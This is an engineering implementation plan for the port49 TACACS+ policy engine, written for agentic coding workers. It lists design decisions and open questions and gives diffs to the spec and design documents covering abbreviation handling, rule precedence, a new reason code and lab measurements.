# Plan 4: Policy Engine Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** The policy engine in full: the file policy's whole grammar resolves a principal on a
device into a compiled, content-addressed blob, the daemon decides every session and command
against that blob by specificity dominance, every decision record names what it was decided
against and replays, and the operator has `explain`, policy tests, replay, access review and
`grants remove`.

**Architecture:** Two packages replace plan 3's borrowed-ahead three. `internal/engine` is the
executor: the blob format (version 2) and the one evaluator the daemon, `port49 policy replay`
and `port49 explain` all run, so a replay that disagrees with the log is a finding, never a
difference between two implementations. `internal/policy` is the authoring side the broker and
the offline tools use: the §11 grammar, scopes with attached roles and the version comparator,
resolution and compilation, joint checks against the inventory, lint, tests, explain, review and
the grant-removal edit. The daemon's authorizer, `author.Engine`, caches compiled blobs by hash
per replica and never reads a platform definition. The accounting spool gains a sink that can
say no. Nothing here talks to a network: the broker still runs inside `port49d` (plan 3,
Decided 1) and the tools read files.

**Tech Stack:** Go 1.22, standard library (`regexp`, `regexp/syntax`, `text/tabwriter`), the
plan 1–3 packages, `gopkg.in/yaml.v3` (already a dependency, including its `Node` API). No new
dependencies. No lab task: nothing in the roadmap's plan 4 entry closes a register row, and the
one row this plan adds (L21) is plan 5's to measure.

**Spec:** `docs/design/2026-08-23-policy-engine-spec.md` §3 (normalization), §4 (grammar,
pipeline stages), §5.1–§5.5 (mint resolution, blob compilation, credential identity, scopes and
`attached_roles`, version comparison), §5.4 (dominance), §5.7 (the decision log in full,
replay), §6 (privilege levels, attribute layering, substitution), §11 (the complete example, as
a corpus), §12 (`explain`, policy tests, access review, `grants remove --subject`), §13
decisions 1–4, 6, 7, 9, 10, 18, 19, §14 "Matching and precedence", "Attributes and privilege"
and "Decision log", §15 L2 (pipelines) and the new L21. Design `docs/design/2026-08-21-port49-design.md`
§12 (the failure matrix), §19 step 4. Roadmap `docs/superpowers/plans/README.md`, "Plan 4",
including the accounting-spool sink and the two carries from plan 3.
**Prerequisite:** plan 3 merged (PR #8). Branch `feature/policy-engine` off `main` at `c2f9553`.

## Why this plan exists

Plan 3 put the first real identity on a real device through three pieces borrowed ahead in their
simplest form, each labelled with this plan's number: a blob of words, `*` and a trailing `**`,
decided deny-overrides (`internal/blob`); an authorizer that reads it (`author.Blob`); and a
policy of literal subjects, roles and grants on the one scope `all_devices`
(`internal/broker/policy`). Design §19 step 4 is where they become the engine the spec
describes. What the roadmap owes, and nothing past it:

- normalization (§3) and the full rule grammar with pipeline stages (§4): `@class` and `/re/`
  terms, case-insensitive comparison, the pipe allowlist, and fail-closed handling of a platform
  that may send abbreviations;
- specificity dominance (§5.4), a partial order, replacing deny-overrides;
- mint resolution (§5.1) over scopes, `attached_roles`, grant expiry, abstract privilege levels
  with `parent:`, and the version comparator (§5.5);
- blob compilation (§5.1.2) with classes expanded for the platform and the normalization
  parameters embedded, and privilege and attribute layering with substitution (§6);
- the decision log in full (§5.7): every record that consulted policy names its bundle and blob
  and what matched, and replays;
- spec §11 as a test corpus, and §12's `explain`, policy tests, access review and `grants remove
  --subject`;
- the real `Authorizer`, replacing the lab's for every broker-minted context;
- the accounting spool's sink that can fail, and a spool that does not advance past a refusal;
- plan 3's two carries: the blob's platform checked against the device's, and a `GetBlob` store
  error answered `store_unavailable`.

Plan 3's hardening properties stay: a blob that does not decode, or does not decode completely,
fails closed; one decision has one hash; no metric label names a device; nothing logs a token.

## Decided in this plan

Where the spec leaves a shape open, this plan chooses, and says why here once:

1. **Two packages, `internal/engine` and `internal/policy`, and plan 3's three are deleted.** The
   executor imports no authoring code, so the daemon cannot come to depend on a policy file; and
   building the engine under a new name keeps every task's tree green while plan 3's blob is
   still wired, until Task 13 switches everything at once.
2. **Blob format version 2** carries the bundle, the platform, the normalization parameters, the
   composed level's name, the session attributes with their placeholders, every rule with the
   role that carries it, the pipe allowlist, and each named class's patterns under its name.
   Classes are carried by name rather than rewritten into regex terms so a record and an
   explanation say `@management`, not a pattern the author never wrote. A blob with no
   `version` — plan 3's — is refused by name, and a daemon never half-reads one.
3. **`bundle` is the `sha256:` of the policy file until plan 6 publishes versioned bundles**, and
   it rides in the blob, so every record the daemon writes names it without the daemon reading the
   policy. Deduplication is therefore per policy version and platform, as spec §5.1.2 already says.
4. **The platform data is a built-in `platform.Dialect` table, borrowed ahead from plan 5.** Every
   value is cited or chosen to fail closed: `pipe_authorized` is false on EOS, NX-OS and IOS-XE,
   because each sent `show clock` alone when `show clock | include …` was typed
   (`tests/lab/results/L2-*.md`) — which contradicts spec §8's example, fixed in Task 1; only
   `arista_eos` renders levels (`priv-lvl`, L16); `operator` renders nowhere (Question 1); entity
   classes are interface names from spec §8 and the lab's own configs. NX-OS, IOS-XE and Junos
   render no level at all, as plan 3 left them (plan 3, Question 2), and that is not a load error
   here: spec §6's "MUST declare a mapping for every level" for a platform that is not
   `priv-lvl`-native is plan 5's, with decision 22's Junos projection and the NX-OS roles L18
   measured.
5. **`expands_abbreviations` is false on every built-in platform**, because no lab run typed an
   abbreviation (new register row L21), and the fail-closed rule spec §3 asks for is done in the
   matcher: a deny's word also matches any proper prefix of itself; a permit's matches only as
   written. `rel` cannot slip past `deny: reload **`; the cost is an over-denial named in the
   `server_msg` (Question 2).
6. **Ties are broken by tuple, then role name, then rule text**, not by declaration order, and the
   permit that dominated is named first even when another permit's tuple sorts above it. §14 asks
   for byte-identical records from a shuffled policy; a record naming a rule by file position
   could not give them. Spec §5.4 is edited to match.
7. **The pipe allowlist is the union over roles that permit something.** A deny-only or
   privilege-only role inherits no default list, or `no_disruptive` would widen every other
   role's allowlist.
8. **Joint policy-and-inventory checks run at load by compiling every subject on every device**:
   a class the platform does not define, a level it cannot render, a ceiling it cannot number, a
   landing level above the ceiling, and `enable: auto` where the enable exchange does not carry the
   principal. A policy that loads therefore never fails to compile at a mint. Only a level some
   subject lands at on some device is checked: `readonly`, `operator` and `admin` are always
   declared (spec §6), so checking every declared level would refuse every policy on a platform
   that maps two of them. A failure refuses the
   policy, naming subject, device and cause; plan 6 turns it into a quarantined device (decision
   20). The cost is O(subjects × devices) at start, which is fine at the lab's size and is plan
   12's to measure at the fleet's.
9. **`on_missing` defaults to `exclude`, and a scope that attaches a role carrying a deny must
   declare it.** The default is the safe direction for a grant; for a mitigation the safe
   direction is the other one, so the author must say it.
10. **Attribute layering takes each layer's sources in name order** — roles by name, grants by
    scope — so which one wins cannot depend on a file's layout; the result keeps first-appearance
    order with an override in the place of what it shadows. Every attribute states its own
    separator; port49 never makes one mandatory, and a `=` in a role or grant is reported.
11. **`{privilege}` renders the abstract level name** (`admin`), and `{device}` the inventory name.
    The template is checked at 255 bytes at load and the filled-in value at mint, where the broker
    holds the same values the daemon will substitute; an overflow is the item error
    `attribute_too_long`, never a truncated attribute.
12. **`author.Lab` stays, as the lab's instrument for seeded contexts only, behind a `lab:` block
    that is now optional.** `author.Engine` is the authorizer for every context the broker minted.
    The register harness (L2, L10, L16, L18) varies Lab's fixed answers one attribute at a time,
    including invented attributes no policy should be able to send, and rewriting it onto
    broker-minted tokens is lab work this plan has no host time for. With no `lab:` block a
    context with no blob is denied.
13. **An authorization whose store read fails answers ERROR**, `store_unavailable`, on the context
    read and on a blob read the cache cannot answer. Plans 1–3 answered FAIL; spec §5.7 and the
    design §12 failure matrix say ERROR, so a device with a local fallback keeps working on its
    own role while the store is down (Question 3).
14. **A new reason, `blob_platform_mismatch`**, added to spec §5.7 in Task 1 before any code emits
    it. No existing reason is true of a blob compiled for another platform than the device's.
15. **The per-replica blob cache holds compiled programs, 1,024 of them, with no invalidation**, and
    is counted (`port49_blob_cache_lookups_total{outcome}`, plus `get_blob` in
    `port49_store_operations_total`). A cached blob answers through a store outage.
16. **`decision.Sink` is an `Emitter` whose `Write` returns the refusal.** The spool drains through
    it and stops at a refused record without advancing `drainOffset`; the broker marks a blob
    emitted only when the sink took it, so the next mint re-emits a refused one. `jsonLines` is the
    one implementation, so nothing else changes type.
17. **Group subjects load and are evaluated by name in the offline tools, and mint for no one** until
    plan 7's directory matches a principal to a group; lint says so. `api:` rights are validated
    and reported, not enforced (plan 7).
18. **The offline tools read a policy file and an inventory file** and ask no broker: `explain`,
    `policy test`, `access review`, `grants remove`, and `policy replay` over a log file. The API's
    `/v1/explain` is plan 7's.
19. **`grants remove` edits the YAML tree**, so comments and the order of everything else survive;
    it removes the subject's grant rows, its block, and the tests naming it, refuses a result that
    does not load, and prints the file (or `--write`s it). Opening the pull request is the
    operator's.
20. **Keys another plan reads are refused by name, not ignored**: `platform_set` and `platforms`
    (plan 5), `key_groups` (in the inventory file until plan 6), a role's `max_session_age`
    (plan 7). `all_devices` must be declared: spec §5.5 says it is an ordinary scope, so the lab's
    slice policy gains the one line.
21. **`security_log: true` is accepted and emits nothing** until something can change a scope's
    membership while the daemon runs, which is plan 6's sync.
22. **A date-only `expires` is the start of that day, UTC**; a full RFC 3339 time is exact. The
    conservative reading of `expires: 2026-12-01` is that the grant is gone when the day begins.
23. **A regex equivalent to `*` or to a literal word is a load error** (spec §14, "Rank lint"),
    for the spellings a lint can recognize; a `(?-i)` literal is not flagged, since case-sensitivity
    is something a word cannot say.
24. **Spec §11's `svc_oxidized` gains `username: svc-config-backup`** (spec §2's own value): as
    printed it fails §14's "a subject with neither fails at policy load", so the example and the
    assertion disagree, and the example is the one corrected.

## Questions for Ryan

None of these blocks a task; each has a recommendation the plan implements as written.

1. **`operator` on `arista_eos` renders nothing, so a policy that lands an EOS session at
   `operator` is refused at load** — including spec §11 as written (its `bgp_operator` and
   `interface_tech`), which the corpus test loads only by adding `priv-lvl=7` in a test-only table.
   Spec §8's example says `priv-lvl=7`; no lab run has measured what a vEOS session at 7 can reach.
   *Recommendation:* keep it refused, measure `priv-lvl=7` on vEOS in plan 5's differential run,
   and map it there.
2. **Every built-in platform ships `expands_abbreviations: false` until L21 is measured.** The
   operator-visible cost: a full word that is a prefix of a deny's word is denied — `show ip`
   under `deny: show ipv6 **` — with a `server_msg` naming the deny. The alternative, `true`
   unmeasured, lets an abbreviation slip past a deny silently. *Recommendation:* ship `false`;
   L21 is one typed abbreviation per platform, so measure it at the next lab session and flip
   each platform on its note.
3. **Authorization now answers ERROR, not FAIL, when the store cannot be read.** At 3am with the
   store down, a device configured `aaa authorization commands … group tacacs+ local` then
   authorizes by the local role (spec §6: the device role is the degraded-mode policy) instead of
   denying every command of every live login. Spec §5.7 and design §12 say ERROR; plans 1–3
   answered FAIL, and whether a device falls through on an authorization ERROR is unmeasured on
   every platform (L4 covers authentication only). *Recommendation:* ERROR, as specified; the
   reference AAA configuration (plan 12) is what makes the fallback role a sane one.
4. **No plan owns spec §12's CI reports**: the effective-permission diff, the shadowed-deny
   report, the privilege-expansion gate, and the dead-rule and fallback-exposure intersection
   checks. Plan 4's roadmap entry names `explain`, policy tests, access review and `grants
   remove`, and this plan builds only those. *Recommendation:* plan 5, which is where the level
   and role data the intersection checks need comes from; say so in the roadmap.

## Global Constraints

Copied verbatim from `CLAUDE.md`, "Code conventions":

- Go 1.22+, module `github.com/rhwendt/port49`, `gofmt` and `go vet` clean, no cgo.
- **snake_case everywhere it is data**: YAML keys, JSON log keys, config, metric names.
- Reason codes are the closed vocabulary of spec §5.7 (`internal/decision/reasons.go`).
  Never invent one; add to the spec table first.
- The log never contains a token, password, challenge, or response. Credentials appear only
  as `credential_sha256`. An unvalidated body is never logged.
- No device identity in metric labels.
- Verify before claiming done: run `make test && make vet` and report the real output.

Carried from plans 2, 2b and 3, and still binding:

- **Every context write outside login goes through a narrow setter.** The engine writes no
  context; the handler's `SetPrivilege` and `TouchContext` are unchanged.
- **Every claim about device behaviour cites a `tests/lab/results/` note or a register row.** A
  claim with neither is marked *unmeasured* and the code does not depend on it (Decided 4, 5).
- **A blob fails closed; one decision has one hash; no metric label names a device; nothing logs a
  token** (plan 3's hardening, kept).
- **Everything borrowed ahead says so** in its package or type comment, naming the plan that
  replaces it: `platform.Dialect` (plan 5).

New in this plan:

- **One new reason code, and only after its spec row:** `blob_platform_mismatch` (Task 1, then
  Task 2).
- **Code is applied as written.** Whole new files are given whole; a change to an existing file is a
  unified diff, applied with `git apply` from the repository root (save the block to a file, or
  pipe it). A hunk that does not apply means the tree is not where this plan expects: stop and say
  so rather than editing by hand.
- **No new dependencies.** `regexp/syntax` and `text/tabwriter` are standard library.
- Branch `feature/policy-engine`; never commit code to `main`.
- Every verification runs `make test && make vet`, `go test -race ./internal/... ./cmd/...`,
  `go vet -tags lab ./tests/lab/...`, and `make build`.
- Commit messages end with:
  ```
  Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
  Claude-Session: https://claude.ai/code/session_01KRDnCbmkhchGxXvV99W4mc
  ```

---

## File Structure

```
docs/design/2026-08-23-policy-engine-spec.md    MOD  §3 rule 4, §5.4 ties, §5.5 on_missing, §5.7 bundle + reason row, §6, §8 example, §11, §15 L21 (Task 1)
docs/design/2026-08-21-port49-design.md         MOD  §19 step 4 borrows from step 5 (Task 1)
docs/superpowers/plans/README.md                MOD  plan 4 as built; hands to 5, 6, 7 (Task 20)
internal/decision/log.go                        MOD  Sink; Policy.{Bundle,Blob,MatchedDeny,MatchedPermits,Stage}; PolicyGrant.Expires; PolicyRule
internal/decision/reasons.go                    MOD  BlobPlatformMismatch
internal/decision/policy_test.go                NEW
internal/daemon/acct/spool.go                   MOD  drains to a decision.Sink; stops at a refusal
internal/daemon/acct/sink_test.go               NEW
internal/platform/dialect.go                    NEW  Dialect, DialectFor, Dialects — borrowed ahead from plan 5
internal/platform/dialect_test.go               NEW
internal/engine/term.go                         NEW  Kind, Term, ParseRule, CanonicalRule
internal/engine/blob.go                         NEW  Blob v2, Encode, Decode, HashOf
internal/engine/attrs.go                        NEW  CheckAttribute, SessionAttributes, the four placeholders
internal/engine/blob_test.go                    NEW
internal/engine/eval.go                         NEW  Compile, Program.Command, Outcome, Dominates, Normalize
internal/engine/eval_test.go                    NEW
internal/policy/version.go                      NEW  CompareVersions
internal/policy/version_test.go                 NEW
internal/policy/file.go                         NEW  the YAML schema
internal/policy/load.go                         NEW  Env, Policy, Load, Parse, the structural checks
internal/policy/rank.go                         NEW  rankLint
internal/policy/load_test.go                    NEW
internal/policy/scope.go                        NEW  Scope.selects, compose
internal/policy/scope_test.go                   NEW
internal/policy/resolve.go                      NEW  Resolve, ResolveSubject, compile, layering, checkDevices
internal/policy/resolve_test.go                 NEW
internal/policy/lint.go                         NEW  Lint, Finding
internal/policy/tests.go                        NEW  Decide, Caveats, RunTests, CommandRaw
internal/policy/lint_test.go                    NEW
internal/policy/spec11_test.go                  NEW  the §11 corpus, order independence
internal/policy/testdata/spec11.yaml            NEW
internal/policy/testdata/spec11-inventory.yaml  NEW
internal/daemon/author/author.go                MOD  Request; the new Authorizer; Decision.Policy; ERROR on store_unavailable
internal/daemon/author/engine.go                NEW  Engine: the daemon's authorizer
internal/daemon/author/engine_test.go           NEW
internal/daemon/author/lab.go                   MOD  the new signatures; the instrument's comment
internal/daemon/author/blob.go                  MOD then DEL (Tasks 12, 13)
internal/daemon/author/author_test.go           MOD
internal/daemon/metrics/metrics.go              MOD  BlobCache; the item-error codes
internal/daemon/metrics/metrics_test.go         MOD
internal/daemon/server/server_test.go           MOD  panicAuthorizer's signatures
internal/broker/broker.go                       MOD  internal/policy and internal/engine; attribute_too_long; re-emits a refused blob
internal/broker/engine_test.go                  NEW
internal/broker/{fixture,identity,broker}_test.go MOD
internal/blob/                                  DEL
internal/broker/policy/                         DEL
internal/policy/labpolicy_test.go               NEW  the lab's slice policy loads against the lab inventory
tests/lab/slice/policy.yaml                     MOD  declares all_devices
cmd/port49d/main.go                             MOD  author.Engine; policy.Load with the inventory; no lab: block
cmd/port49d/broker_test.go                      MOD
internal/config/config.go                       MOD  lab: optional
internal/config/config_test.go                  MOD
internal/policy/explain.go                      NEW  Explain, Render
internal/policy/explain_test.go                 NEW
internal/policy/review.go                       NEW  Review
internal/policy/review_test.go                  NEW
internal/policy/edit.go                         NEW  RemoveSubject
internal/policy/edit_test.go                    NEW
internal/replay/replay.go                       NEW  Replay
internal/replay/replay_test.go                  NEW
cmd/port49/main.go                              MOD  usage; explain, policy, access, grants
cmd/port49/policy.go                            NEW  the five tools' commands (Tasks 15–19)
cmd/port49/policy_test.go                       NEW
```

Twenty tasks: **one docs task first** (Task 1: the spec rows and edits the code relies on), **eighteen
code tasks** (2–19), and **one docs task last** (Task 20: the roadmap). Under the 25-task line, so
one plan. Tasks 2–11 add packages beside the running system and change nothing a device sees
except the spool's retry; Task 12 adds the new authorizer beside the old; **Task 13 is the switch**,
after which the broker writes version-2 blobs and the daemon reads them. Every task leaves `make
test` green.

---
### Task 1: The spec says what the engine changes, before the code does

**Files:**
- Modify: `docs/design/2026-08-23-policy-engine-spec.md` (§3 rule 4, §5.4 "Ties and explain", §5.5,
  §5.7 "Three properties" and the reason table, §6 substitution, §8's example, §11, §15)
- Modify: `docs/design/2026-08-21-port49-design.md` (§19 step 4)

**Interfaces:**
- Produces: the §5.7 row for `blob_platform_mismatch`, which Task 2 adds as a constant and Task 12
  emits; register row L21, which `internal/platform/dialect.go` (Task 4) cites; the §5.4 tie-break
  Task 6 implements; the §8 correction Decided 4 rests on.

Why first: a reason code is added to the spec table before any code names it (`CLAUDE.md`), and
the lab contradicts one line of spec §8 — lab register rule 4 says the doc is fixed, citing the
results note, and the commit says so.

- [ ] **Step 1: Apply the spec and design edits**

Eight spec changes. §3 rule 4 gains the fail-closed mechanism for abbreviations and names L21;
§5.4's tie-break becomes role name then rule text (Decided 6); §5.5 says when `on_missing` must be
declared (Decided 9); §5.7 says what `bundle` is until plan 6 (Decided 3) and gains the
`blob_platform_mismatch` row; §6 says what `{device}` and `{privilege}` render and where length is
checked; §8's example is corrected to `pipe_authorized: false`, citing `L2-arista_eos.md`, with a
paragraph saying so; §11's `svc_oxidized` gains the username §2 gives it (Decided 24); §15 gains
row L21 and its note. The design gains one sentence at §19 step 4.

<!-- patch: docs/design/2026-08-23-policy-engine-spec.md -->
````diff
diff --git a/docs/design/2026-08-23-policy-engine-spec.md b/docs/design/2026-08-23-policy-engine-spec.md
index ceac013..845e833 100644
--- a/docs/design/2026-08-23-policy-engine-spec.md
+++ b/docs/design/2026-08-23-policy-engine-spec.md
@@ -245,6 +245,16 @@ entire class.
    `show running-config` before matching, or `show **` is bypassable. Where port49 cannot
    expand reliably, the platform MUST be marked as such and the daemon MUST fail closed
    rather than match a possibly-abbreviated vector.
+
+   Failing closed is done in the matcher, with no expansion table (plan 4): on a platform
+   marked `expands_abbreviations: false`, a **deny's** literal word also matches any
+   non-empty proper prefix of itself, case-insensitively, so `rel` is denied by
+   `deny: reload **`; a **permit's** word matches only as written, so `sh run` is not
+   permitted by `permit: show **`. An abbreviation is therefore denied or matched as written
+   and never slips past a deny. The cost is an over-denial of a full word that is a prefix of
+   a deny's word — `show ip` against `deny: show ipv6 **` — reported by name in the
+   `server_msg`. Whether any platform sends abbreviations at all is unmeasured, so every
+   built-in platform is marked `false` until it is (§15, L21).
 5. **Preserve argument boundaries.** Arguments are never re-joined.
 
 ---
@@ -742,8 +752,11 @@ that declines to rank incomparable rules is the only formulation that stays cons
 every case.
 
 **Ties and explain.** Where several rules of the same verdict match and `explain` must name
-one, the tie is broken by lexicographic comparison of the tuples, then by declaration order.
-This is presentation only and cannot change a decision.
+one, the tie is broken by lexicographic comparison of the tuples, then by role name, then by
+rule text. This is presentation only and cannot change a decision. It is not declaration
+order, because the rule a record names is part of the record, and a shuffled policy must
+produce byte-identical records (§14, "Order independence"). The permit a record names first is
+the one that dominated, even where another permit's tuple sorts above it.
 
 Specificity is a property of the rule and the command, never of position in a file, so
 **evaluation is order-independent**: reordering roles, grants, or rules within a role cannot
@@ -883,7 +896,9 @@ decommissioning}` for read-only on the way out.
 `on_missing` MUST be explicit where an attribute is optional, and the safe direction differs
 by rule type: for a deny-bearing scope, a missing attribute means *include* (assume
 vulnerable); for a permit-bearing scope it means *exclude*. A broken inventory sync silently
-lifting a mitigation is the failure to design against.
+lifting a mitigation is the failure to design against. So a scope that attaches a role
+carrying a deny MUST declare `on_missing` — omitting it is a load error — and any other scope
+defaults to `exclude` (plan 4).
 
 `security_log: true` marks a scope whose membership changes are security events. This is
 required because a scope keyed on device state makes **source-of-truth write access
@@ -1368,7 +1383,10 @@ for `copy`, a deny matched the destination more specifically, and dominance fail
 **Log inputs and policy identity, not a narrative.** The matched rules are included because
 they make a record readable on its own, but the blob hash is what makes it provable. A replay
 that disagrees with the logged verdict is itself a finding — version skew, or tampering — so
-`bundle` and `blob` are mandatory on every record that consulted policy.
+`bundle` and `blob` are mandatory on every record that consulted policy. Until the inventory
+service publishes versioned bundles (§10), `bundle` is the `sha256:` of the policy file the
+blob was compiled from, a string; the blob carries it, so a daemon that never reads the policy
+still logs it.
 
 **Keep the raw arguments alongside the normalized vector.** Normalization (§3) is where
 matcher bugs live. A record holding only the vector erases the evidence of its own
@@ -1477,6 +1495,7 @@ not an unvalidated body. A connection with no verified chain names no one.
 | `device_unknown` | the source address is not in the admission trie (§10) |
 | `platform_unknown` | the device's platform has no adapter; generic fallback applied |
 | `blob_unavailable` | the referenced blob could not be resolved from the store or any cache — a store fault, alarmed (§5.1.1) |
+| `blob_platform_mismatch` | the context's blob was compiled for a platform other than the one inventory gives the device — inventory changed since the mint, or the broker and the daemon read different inventories. Its dialect and attributes are another platform's, so it is never answered from; operational, alertable beside `blob_unavailable` |
 | `device_quarantined` | the device is in inventory but failed joint validation against policy (§10); the connection is closed without a reply, as for `device_unknown`, until fixed |
 
 Every event has a success reason and at least one failure reason in this table, so
@@ -2059,7 +2078,10 @@ and CI MUST report the shadowing so an override never happens silently.
 
 Values support a **fixed** substitution vocabulary — `{username}`, `{principal}`,
 `{device}`, `{privilege}` — and nothing more. `home-directory*/home/{username}` is the
-motivating case; a general template language would be a footgun.
+motivating case; a general template language would be a footgun. `{device}` is the device's
+inventory name and `{privilege}` the abstract level the roles compose to (`admin`, not `15`).
+An attribute is at most 255 bytes as written, checked at load, and again once filled in, at
+mint, where the broker holds the same values the daemon will substitute.
 
 ### Validation without semantics
 
@@ -2243,12 +2265,19 @@ platforms:
       loopback:   ['^Loopback[0-9]+$']
       physical:   ['^Ethernet[0-9/.]+$', '^Port-Channel[0-9]+$']
     enable_username: principal
-    expands_abbreviations: true
+    expands_abbreviations: false   # unmeasured on every platform (§15, L21)
     pipe_token: "|"
-    pipe_authorized: true
+    pipe_authorized: false         # measured: tests/lab/results/L2-arista_eos.md
     port_pattern: '^vty[0-9]+$'
 ```
 
+The example said `pipe_authorized: true` until 2026-09-23, and the lab says otherwise: on vEOS
+4.31.2F, NX-OS 10.4(2)F and IOS-XE 17.13.01a alike, a typed `show clock | include …` was sent to
+port49 for authorization as `show clock` alone (`tests/lab/results/L2-arista_eos.md`,
+`L2-cisco_nxos.md`, `L2-cisco_iosxe.md`, "Truncation length"). The device applied the modifier
+itself, so on those images a pipe rule protects nothing and `explain` says so. Whether any
+modifier ever reaches port49 on any platform is unmeasured.
+
 Most devices need far less. A time server or a BMC that does authentication plus one
 attribute is complete in four lines:
 
@@ -3325,7 +3354,7 @@ subjects:
   - {name: security_ir,   group: "CN=security-ir,OU=Groups,DC=example,DC=com",
      enable: token, token_ttl: 60s}
   - {name: svc_oxidized,  identity: "system:serviceaccount:netops:oxidized",
-     enable: token, token_ttl: 900s}
+     username: svc-config-backup, enable: token, token_ttl: 900s}
 
 grants:
   - {subject: netops_admins, scope: all_devices,   roles: [network_admin], max_privilege: admin}
@@ -4156,6 +4185,7 @@ implemented against a guess. This section is the one place the distinction is ke
 | **L18** | How each platform treats a reply attribute it did not ask for: applied, ignored, or the session killed. Another vendor's attribute, an invented one, and a known attribute carrying a value the device cannot use, each in the OPTIONAL and the MANDATORY spelling. Per variant: whether the session opens and, when it does not, what the device says verbatim; what role or privilege the session ends up with; and whether the device still sends per-command authorization. | Whether an adapter may send one attribute list to a mixed fleet at all (§8). RFC 8907 §8.2 says an OPTIONAL argument a device does not understand SHOULD be ignored and a MANDATORY one MUST fail the authorization; `lab.session_attributes` in `tests/lab/port49d-lab.yaml` rested on the first half until IOS-XE disproved it (L10), and what an operator's typo costs (§6) rests on the same answer. Also decision 22's two Junos attributes (§13, gated on L12). | EOS, NX-OS, IOS-XE, Junos | open — added and measured 2026-09-22 on all five images, `tests/lab/l18_test.go`. **Three vendors answer three different ways, so §8 cannot have one rule.** vEOS follows §8.2 in both directions. The N9Kv and both Junos images honour neither half and ignore everything, mandatory included. IOS-XE refuses the session for anything it does not recognise under either flag — and a run of those refusals stops it answering SSH at all for about a minute, without sending port49 a packet. On Junos `local-user-name` is applied under either flag and **`user-permissions` does nothing**, which is decision 22's second attribute measured for the first time. **The per-command reply is measured too, 2026-09-22, and it does not follow the session reply:** the C8000V refuses EVERY command in the session — `Command authorization failed.` — for any of the three attributes under either flag, on authorizations port49 answered `permit`; vEOS ignores an optional unknown there and refuses every command on a MANDATORY one; the N9Kv ignores all of them. Junos has no per-command reply to ask it of (L10, L14; decision 21). Open: every non-SSH transport, and whether IOS-XE's SSH condition is the vty pool; see below |
 | **L19** | The maximum password length each platform accepts via PAP, on every login path where the device uses PAP. | The 30-character handle (design document §8): an authentication START carries a PAP password in `data`, whose length field is one byte, so PAP can bound the handle where the ASCII prompt does not — and NX-OS uses PAP for every SSH login by default | all | open — added 2026-09-23, split from L8. On the N9Kv an SSH login is carried as PAP and 127 characters arrive (`tests/lab/results/L8-cisco_nxos.md`); PAP on any other path, and on EOS, Junos and IOS-XE, which this lab does not configure for it, is unmeasured; see below |
 | **L20** | Whether a device answers a repeat API request without asking TACACS+; for how long; what it keys that answer on (the credential, the username, the client); whether a **wrong password** for the same user inside that window is also accepted; and whether a credential port49 would now refuse is re-checked inside it. | Whether a revocation in port49 reaches an API client at all (§5.1.4), and decision 15's bound on how long a spent token works — the receipt's `receipt_idle_ttl` and `receipt_max_age` act only on exchanges the device sends | IOS-XE; then every HTTP API transport | open — added 2026-09-23. IOS-XE RESTCONF answered a repeat of an already-spent token, 3s later, with `200 OK` and **zero** TACACS+ traffic (`tests/lab/results/L1-restconf-cisco_iosxe.md`), so a revocation in port49 cannot reach that repeat. Open: the window's length, what the device keys the answer on, and whether a wrong password within the window is accepted too; see below |
+| **L21** | Whether each platform sends the command words the operator typed (`sh run`) or the resolved ones (`show running-config`) on a per-command authorization request, and on the accounting record for it. | `expands_abbreviations` per platform (§3 rule 4, §8): where it is `false` a deny's word matches its own abbreviations, which over-denies, and where it is wrongly `true` an abbreviation slips past a deny | EOS, NX-OS, IOS-XE | open — added 2026-09-23 by plan 4; every built-in platform ships `false` until its row closes; see below |
 
 **What has been measured so far, per row.** The measurements exist and the notes are in the
 repository. NX-OS was measured on 2026-09-20 and is no longer outstanding; **IOS-XE was
@@ -5503,5 +5533,13 @@ than a platform family, except where the row's own *Unmeasured* paragraph says o
   question on eAPI and NX-API with Basic credentials on a kept-alive connection, and on every
   other platform.
 
+- **L21** — added 2026-09-23 by plan 4. No lab run has typed an abbreviation: every command
+  the register's notes record was typed in full, so nothing in `tests/lab/results/` says whether
+  a device resolves `sh run` before asking port49. `expands_abbreviations` is therefore `false`
+  on every built-in platform, which is the direction that fails closed (§3 rule 4). *To
+  measure:* per platform, type `sh ver`, `sho run` and one abbreviation of a word a lab deny
+  names, and record the `cmd` and `cmd-arg` values of the authorization request and of the
+  accounting record.
+
 Entries are added when a new claim is made, never removed. A closed entry keeps its row so a
 later reader can find the evidence.
````

<!-- patch: docs/design/2026-08-21-port49-design.md -->
```diff
diff --git a/docs/design/2026-08-21-port49-design.md b/docs/design/2026-08-21-port49-design.md
index 5ad785e..9e7ce5f 100644
--- a/docs/design/2026-08-21-port49-design.md
+++ b/docs/design/2026-08-21-port49-design.md
@@ -1668,7 +1668,9 @@ built against a guess.
    over SSH on all five images including IOS-XE, stays open on `deadtime`, the transports it
    has not measured, and authorization fall-through (policy engine spec, §15).
 4. Policy engine in full: normalization, matcher, scopes, `explain`, policy tests, the
-   decision log and replay.
+   decision log and replay. It borrows ahead from step 5 in the simplest form: a built-in
+   table of each shipped platform's dialect — pipe token, entity classes, level rendering —
+   with every value either measured and cited or chosen in the direction that fails closed.
 5. Platform adapters: built-in definitions, entity classes, user overrides, pinned platform
    set, projection for session-only platforms. L9, L11, and L12 govern this step; the
    projection generator is not final until L12 closes (spec §13, decision 22).
```

- [ ] **Step 2: Check and commit**

Run: `grep -n 'blob_platform_mismatch\|^| \*\*L21\*\*\|pipe_authorized: false\|username: svc-config-backup' docs/design/2026-08-23-policy-engine-spec.md`
Expected: the reason row in §5.7, the L21 row in §15, the corrected §8 example line, and §11's
subject line.

```bash
git add docs/design/2026-08-23-policy-engine-spec.md docs/design/2026-08-21-port49-design.md
git commit -m "docs: the spec says what the policy engine changes

Adds blob_platform_mismatch to the §5.7 reason table before any code
emits it, and register row L21 (abbreviations, unmeasured everywhere).
§3 rule 4 states the fail-closed mechanism; §5.4 breaks ties by role
name and rule text, never file position; §5.5 says when on_missing
must be declared; §5.7 says bundle is the policy file's sha256 until
plan 6; §6 says what {device} and {privilege} render.

The lab contradicts §8's EOS example: pipe_authorized was true, and
vEOS, NX-OS and IOS-XE each sent 'show clock' alone for a typed
'show clock | include ...' (tests/lab/results/L2-arista_eos.md,
L2-cisco_nxos.md, L2-cisco_iosxe.md). The example is corrected and the
paragraph under it says so (lab register rule 4). §11's svc_oxidized
gains the username §2 gives it, which §14 requires.

Co-Authored-By: Claude Opus 5.5 (1M context) <noreply@anthropic.com>
